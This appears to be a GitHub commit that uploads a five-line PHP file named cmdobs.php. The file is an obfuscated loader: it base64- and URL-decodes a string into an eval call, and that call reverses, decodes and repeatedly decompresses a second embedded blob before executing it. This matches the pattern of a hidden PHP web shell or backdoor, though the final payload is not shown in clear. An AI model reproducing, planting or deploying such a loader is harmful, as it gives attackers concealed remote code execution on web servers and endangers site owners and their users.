c6ef6fc0808a7febb103dbc132f1dd7a4dd734f1
FadliYunianto <75653432+FadliYunianto@users.noreply.github.com>
2023-08-17 21:20:06 +0700

    Add files via upload

---
+++ cmdobs.php
@@ -0,0 +1,5 @@
+<?=$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "==AAEwTCye0n5U1sMw42ta9ZDoi95d+onuV1sV317k3yLvzQb47cPDl9jnXtg0ywqMqDi97/4AGNj9/xAgTA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
+exit;
+?>
